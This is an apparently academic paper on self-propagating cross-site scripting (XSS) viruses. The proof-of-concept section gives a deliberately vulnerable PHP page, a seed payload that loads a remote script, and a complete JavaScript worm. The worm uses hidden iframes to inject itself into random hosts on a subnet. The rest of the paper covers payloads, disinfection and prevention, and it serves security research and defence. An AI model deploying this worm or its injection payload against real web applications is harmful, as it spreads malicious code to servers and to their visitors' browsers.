<h2 class="western">Abstract</h2>
<p class="western" style="margin-bottom: 0.2in;">This paper explores
the new threat of cross-site scripting (XSS) viruses. These
viruses are a new species which are platform independent and not
affected by common firewall configurations. XSS viruses could have a
significant impact for Internet continuity, including distributed
denial of service (DDOS) attacks, spam and dissemination of browser
exploits. This is particularly relevant with the increasing
sophistication of web browsers and the growing popularity of web
based applications such as Wikis and Blogs.</p>
<h2 class="western">Introduction</h2>
<p class="western" style="margin-bottom: 0.2in;">As an inevitable
consequence of expanded web application functionality, security
implications on various levels have increased. The appearance of XSS
is one such security issue. This vulnerability allows code to be
injected into web sites with the aim of being parsed and/or executed
by web browsers. 
</p>
<p class="western" style="margin-bottom: 0.2in;">Broadly, cross-site
scripting can be divided into two areas: permanent and non-permanent.
Non-permanent XSS is returned immediately and doesn't remain on the
server. Alternatively, permanent XSS will remain on the server and be
returned to any browser requesting the injected page. This paper is
particularly concerned with the permanent variety of XSS.</p>
<p class="western" style="margin-bottom: 0.2in;">It is possible to
inject self propagating XSS code into a web application and it will
spread via client web browsers. This creates a symbiotic relationship
between browser and application server. The code will reside on
vulnerable web applications and be executed within the client web
browser. This relationship is not necessarily one-to-one.</p>
<h2 class="western">Proof of Concept</h2>
<p class="western" style="margin-bottom: 0.2in;">The following proof
of concept demonstrates a XSS virus. The vulnerable environment
created is an example scenario required for XSS viruses and does not
show an exhaustive set of possible conditions. It illustrates
permanent XSS within a web application. In this case, the
vulnerability is exploitable via a get request, which allows a
trivial virus to be created.</p>
<p class="western" style="margin-bottom: 0.2in;">Initially an instance
of the vulnerable web application will be seeded with the
self-propagating code. When this code is executed by web browsers, it
results in their infection. The infected web browsers connect to
random sites and perform the exploiting get request. The injected
code will, in turn, infect further vulnerable web applications with
the self-propagating code.</p>
<p class="western" style="margin-bottom: 0.2in;">The following crafted
permanent XSS exploitable PHP page can be infected with a virus. The
page accepts a parameter (param) value and writes it to a file
(file.txt). This file is then returned in the request to the browser.
The file will contain the previous value of the &#8220;param&#8221;
parameter. If no parameter is passed it will display the file without
updating it.</p>
<p class="western" style="margin-bottom: 0.2in;">Web Application:
index.php</p>
<pre class="code-western"><tt>&lt;?php</tt>
<tt>  $p=$HTTP_GET_VARS[&#8217;param&#8217;];</tt>
<tt>  $filename = &#8220;./file.txt&#8221;;</tt>

<tt>  if ($p != &#8220;&#8221;) {</tt>
<tt>    $handle=fopen($filename, &#8220;wb&#8221;);</tt>
<tt>    fputs($handle, $p);</tt>
<tt>    fclose($handle);</tt>
<tt>  }</tt>

<tt>  $handle = fopen($filename, &#8220;r&#8221;);</tt>
<tt>  $contents = fread($handle, filesize($filename));</tt>
<tt>  fclose($handle);</tt>

<tt>  print $contents;</tt>
<tt>?&gt; </tt></pre><p class="western" style="margin-bottom: 0.2in;">
This page (index.php) was hosted on multiple virtual servers within a
10.0.0.0/24 subnet. One web application instance was then seeded with
the following code which retrieves a javascript file and executes it.
Alternatively, it is possible to inject the entire code into the
vulnerable applications rather than requesting a javascript file. For
simplicity, a javascript file (xssv.jsp) was requested.</p>
<p class="western" style="margin-bottom: 0.2in;">Injected Seed Code:</p>
<pre class="code-western" style="margin-bottom: 0.2in;"><code>&lt;iframe name=&#8221;iframex&#8221; id=&#8221;iframex&#8221; src=&#8221;hidden&#8221; style=&#8221;display:none&#8221;&gt;&lt;/iframe&gt; &lt;script SRC=&#8221;http://&lt;webserver&gt;/xssv.js&#8221;&gt;&lt;/script&gt;</code></pre><p class="western" style="margin-bottom: 0.2in;">
The javascript file that was requested in the example is shown below.
Its self-propagation uses an iframe which is periodically reloaded
using the loadIframe() function. The target site IP address of the
iframe is selected randomly within the 10.0.0.0/24 subnet via the
function get_random_ip(). The XSS virus uses a combination of these
two functions and the continual periodic invocation using the
setInterval() function.</p>
<p class="western" style="margin-bottom: 0.2in;">Javascipt: xssv.jsp</p>
<pre class="code-western"><tt>function loadIframe(iframeName, url) {</tt>
<tt>  if ( window.frames[iframeName] ) {</tt>
<tt>    window.frames[iframeName].location = url;   </tt>
<tt>    return false;</tt>
<tt>  }</tt>
<tt>  else return true;</tt>
<tt>}</tt>

<tt>function do_request() {</tt>
<tt>  var ip = get_random_ip();</tt>
<tt>  var exploit_string = '&lt;iframe name="iframe2" id="iframe2" src="hidden" style="display:none"&gt;&lt;/iframe&gt; &lt;script SRC="http://&lt;webserver&gt;/xssv.js"&gt;&lt;/script&gt;';</tt>

<tt>  loadIframe('iframe2', "http://" + ip + "/index.php?param=" + exploit_string);</tt>
<tt>}</tt>

<tt>function get_random()</tt>
<tt>{</tt>
<tt>  var ranNum= Math.round(Math.random()*255);</tt>
<tt>  return ranNum;</tt>
<tt>}</tt>

<tt>function get_random_ip()</tt>
<tt>{</tt>
<tt>  return "10.0.0."+get_random();</tt>
<tt>}</tt>

<tt>setInterval("do_request()", 10000); </tt></pre><p class="western" style="margin-bottom: 0.2in;">
Viewing the seeded web application caused the browser to infect other
web applications within the 10.0.0.0/24 subnet. This infection
continued until some, but not all, applications were infected. At
this point the browser was manually stopped. Another browser was then
used to view one of the newly infected web applications. The virus
then continued to infect the remaining uninfected web applications
within the subnet. 
</p>
<p class="western" style="margin-bottom: 0.2in;">This proof of concept
shows that under controlled conditions, not dissimilar to a real
world environment, a XSS virus can be self-propagating and
infectious.</p>
<h2 class="western">Conventional Virus Differences</h2>
<p class="western" style="margin-bottom: 0.2in;">Conventional viruses
reside and execute on the same system. XSS viruses separate these two
requirements in a symbiotic relationship between the server and the
browser. The execution occurs on the client browser and the code
resides on the server.</p>
<p class="western" style="margin-bottom: 0.2in;">Platform
indiscrimination also differentiates a XSS virus from its
conventional counterparts. This is due to the encapsulation within
HTML and the HTTP/HTTPS protocol. These standards are supported on
most web browsers running on a <span style="background: transparent none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;">variety</span>
of operating systems, making cross-site scripting viruses platform
independent. This platform independence increases the number of
potential web applications that can be infected. 
</p>
<h2 class="western">Infection</h2>
<p class="western" style="margin-bottom: 0.2in;">Cross-site scripting
virus infection occurs in two stages and usually on at least two
devices. As such, there are two kinds of infections that work
symbiotically. 
</p>
<p class="western" style="margin-bottom: 0.2in;">The server is
infected with persistent <span style="background: transparent none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;">self-propagating</span>
code that it doesn't execute. The second stage is browser infection.
The injected code is loaded from the site into the non-persistent web
browser and executed. The execution then seeks new servers to be
exploited and potentially executes its payload. Typically, there will
be one infected server to many infected browsers.</p>
<h2 class="western">Payload</h2>
<p class="western" style="margin-bottom: 0.2in;">Like conventional
viruses, XSS viruses are capable of delivering payloads. The payloads
will be executed in the browser and have the restriction of HTML
compliant code. That is, the payload can perform HTML functions,
including javascript. 
</p>
<p class="western" style="margin-bottom: 0.2in;">Whilst this does pose
limitations, XSS viruses are still capable of malicious activity. For
example, the payload could deliver a DDOS attack, display spam or
contain browser exploits. Future payload capability is likely to be
greater due to increasing browser sophistication.</p>
<h2 class="western">Disinfection</h2>
<p class="western" style="margin-bottom: 0.2in;">The
relationship between the server and one browser can be broken by
simply shutting down the browser. However, there is currently no
means to prevent browser re-infection other than disabling browser
functionality. 
</p>
<p class="western" style="margin-bottom: 0.2in;">Potential
disinfection methods will involve the referrer field from the request
header. This is due to the fact that the referrer is likely to be
logged on web servers where infection has been attempted. Thus, where
referrer spoofing hasn't occurred, following the log files will
reveal a trail back to the source of the virus.</p>
<h2 class="western">Prevention</h2>
<p class="western" style="margin-bottom: 0.2in;">A common initial
preventative to viral infection is a network level firewall. As
HTTP/HTTPS protocols are afforded unvetted access through common
firewall configurations, these firewall barriers are ineffectual. A
potential remedy to this is an application firewall with the
appropriate XSS virus signatures. Whilst unlikely, the
most obvious way to prevent XSS viruses is to remove XSS
vulnerabilities from web applications.  </p>
<h2 class="western">Conclusion</h2>
<p class="western" style="margin-bottom: 0.2in;">The infectious nature
of XSS viruses has been demonstrated within a controlled environment.
It was achieved through a purposely crafted vulnerable web
application distributed across a subnet. This environment was
subsequently infected.</p>
<p class="western" style="margin-bottom: 0.2in;">XSS viruses are a new
species. They distinguish themselves from their conventional cousins
through the requirement for a server-client symbiotic relationship
and their platform independence. These differences have both positive
and negative influences on the virulence of infection. 
</p>
<p class="western" style="margin-bottom: 0.2in;">This paper
illustrates that XSS viruses are platform independent and capable of
carrying out malicious functions. Whilst there are mitigating
factors, these points coupled with the increasing sophistication of
web browsers show the threat of XSS viruses. Proactive measures need
to be taken in order to combat this threat, before XSS viruses become
endemic.
